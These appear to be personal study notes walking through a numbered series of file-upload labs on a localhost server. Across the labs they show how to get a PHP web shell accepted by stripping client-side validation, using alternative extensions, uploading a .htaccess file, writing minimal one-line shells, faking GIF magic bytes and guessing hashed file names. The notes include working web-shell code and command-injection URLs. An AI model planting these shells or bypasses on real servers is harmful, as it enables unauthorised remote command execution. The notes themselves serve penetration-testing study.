Imagine that you have a webpage, and this page have a section of uploads file, like an image of the profile.

You can upload a malicious file like a reverse shell in php if the server have apache and interpret php

---

# Upload 1

You can upload a [Web shell](../../Shells/Web%20shell/Web%20shell.md) write in php

````php
<?php
    system($_GET['cmd']);
?>
````

When you open the url where is the image you can use the parameter cmd to inject commands

> http://localhost:9001/uploads/cmd.php?cmd=id


---

# Upload 3

Only admit files with extensions: .jpg, .jpeg, .bmp, gif, png

When we see some type of validiation we have to check if it is client side or server side (or both)

If we check the source code, we can see an script named **validate.js**

![](../../Images/Pasted%20image%2020230821172705.png)

We can see that in a few lines up that there are an onsubmit attribute 

![](../../Images/Pasted%20image%2020230821172838.png)

If we do ctr+shift+c and click in the buttom of uploads, three lines up we can delete the attribute

![](../../Images/Pasted%20image%2020230821173229.png)

If we delete the attribute we are omitting the script that check if the file have a correct extension

Remember, when you reload the website you have to delete again the submit attribute

And there we go

![](../../Images/Pasted%20image%2020230821173434.png)

ðŸ¥³ðŸ¥³ The file was upload successfully

---

# Upload 10

When we try to upload the cmd.php, we can see that the validation is in the server, (**tip --> Apply a redirect when upload the file**)

A server can interpretate different files php with different extensions, you can search in google

> php alternative extensions

You have [hacktricks webpage](https://book.hacktricks.xyz/pentesting-web/file-upload) that contemplates different extensions...

If you open Burpsuite and process the request, you can change the extension of the file

![](../../Images/Pasted%20image%2020230822123151.png)
![](../../Images/Pasted%20image%2020230822123201.png)

**Important!!**
He accept the file, but not always that accept the file the code can be interpreted

In this case we can see the code in source code, but this is not interpreted

If the extension don't work you can try other extension (php4, php5)

In this case works with **php5**

![](../../Images/Pasted%20image%2020230822123818.png)

---

# Upload 11

In this lab we try php1,2,3,4,5 but nothing of this works, php6 and php7 are sucessefully upload but the code is not interpreted, we have the **pht** extension an this works

![](../../Images/Pasted%20image%2020230822154943.png)

---

# Upload 12

In this case we can try a lof of extension, but doesn't work

In this case we are going to create a extension that will be interpreted by php

For more information you can search

> .htaccess file upload bypass

To do this you can do the following steps:

1. In filename you can put [.htaccess](https://es.wikipedia.org/wiki/.htaccess)
2. In Content-Type you can put text: **text/plain**
3. Delete the content and put this phrase

> AddType application/x-httpd-php .test


With this phrase (that are going to be in .htaccess file) are you saying that all files that have .test can interprete php code

![](../../Images/Pasted%20image%2020230822160350.png)

If we can upload this file, all file that have extension .test are going to be interpreted by php

![](../../Images/Pasted%20image%2020230822160515.png)
![](../../Images/Pasted%20image%2020230822160528.png)

The solution of this is that a user can't upload a .htacess file

---

# Upload 16

Now the restriction is by the size of the file

In this case, we can see the max size in the **request**

![](../../Images/Pasted%20image%2020230822162110.png)

You can change the size of the file 

or

You can reduce the code of php (monkey pentester offers a reverse shell in one line for this occasions)

In this case if you change a little the code, you can upload the file

````php
<?php system($_GET['c']);?>
````

You can use a 0 

````php
<?php system($_GET[0]);?>
````

In the url be like:

> http://localhost:9001/upload16/uploads/cmd.php?0=id

---

# Upload 17

In this case the size is less, when you try the web shell with

````php
<?php system($_GET[0]); ?>
````

Doesn't work, you can try with other utilities that exec, but doesn't work

````php
<?php shell_exec($_GET[0]); ?>
````

But you can limit this so much like this

````php
<?=`$_GET[0]`?>
````

To use this is equal than the other ocassions

> http://localhost:9001/upload17/uploads/setenso.php?0=id

---

# Upload 21

This restrictions look the **magic numbers/ magic bytes** that are the first bytes of the file.

In this case when we upload a file in Content-Type put application/x-php, in case that you upload a image the content type change to image-related

You can change this:

![](../../Images/Pasted%20image%2020230822165751.png)

Another thing that you can do is to change the first bytes

If you do a file cmd.php you can see that is a PHP script, if you use xxd cmd.php the first bytes identify the file.

I don't know what are the first bytes that represent that

![](../../Images/Pasted%20image%2020230822170201.png)

You can search this in google 

> list of signatures wikipedia

And filter the bytes separated two by two

Some types don't appear like php, but zip yes and a lot of more

You can put **GIF8;** in the first line of the file, this is used in GIF files, if you use again xxd (you can see that bytes change) and file command you can see that appear like GIF file

![](../../Images/Pasted%20image%2020230822170854.png)
![](../../Images/Pasted%20image%2020230822170906.png)

# Uploads 23

The restriction is that only admit GIF files (we see in **Upload 21**):

But now there are a validation in the part of the client

![](../../Images/Pasted%20image%2020230822171306.png)

Remember this, we can delete the **onsubmit attribute**

![](../../Images/Pasted%20image%2020230822171349.png)

And now we can use Burpsuite to see the request and response

You can try if they are validating the content-type:

Put the Content-Type of a GIF

> Content-Type: image/gif

Appear that don't work

![](../../Images/Pasted%20image%2020230822172600.png)

You can try to add the **GIF8;**

![](../../Images/Pasted%20image%2020230822172653.png)

And **works**!!

# Upload 31

Same, intercept the web shell

Mmm this is so rare, we can upload the file and see a gif

![](../../Images/Pasted%20image%2020230822173032.png)

Some developers keep the file with other name (this normally see when you don't have permission to do directory listening), the name of the GIF check is uploads/435ed7e9f07f740abf511a62c00eef6e.gif

If you count the character

![](../../Images/Pasted%20image%2020230822173359.png)

You can see that are 32, the hashes in MD5 have a length of 32 characters

You can use md5sum to see the hash

> echo -n "cmd" |  md5sum

Now if you put this in the url, you can see the file

> http://localhost:9001/upload31/uploads/dfff0a7fa1a55c8c1a4966c19f6da452.php

---

# Upload 33

In this case the hash is applied for all the name, include the .php extension

![](../../Images/Pasted%20image%2020230822174847.png)

But the URL have to content .php extension

> http://localhost:9001/upload33/uploads/b0e4bdfca013a84e5f0b9bc9ae028945.php

---

# Upload 35

You can obtain the md5 hash from the full file, no for the name

![](../../Images/Pasted%20image%2020230822175357.png)

You can try to search this, but doesn't work

In this case the hash has **forty characters** this can be **sha1sum**

Now we can see different variants, the sha1sum can be to the name of the file, to the name of the file with the extension or the file content, in this case is **file content**

![](../../Images/Pasted%20image%2020230822175815.png)

The URL be like:

> http://localhost:9001/upload35/uploads/e7272b35c1795d0c4670a1ec0ba5b8dfbc42780c.php?cmd=id
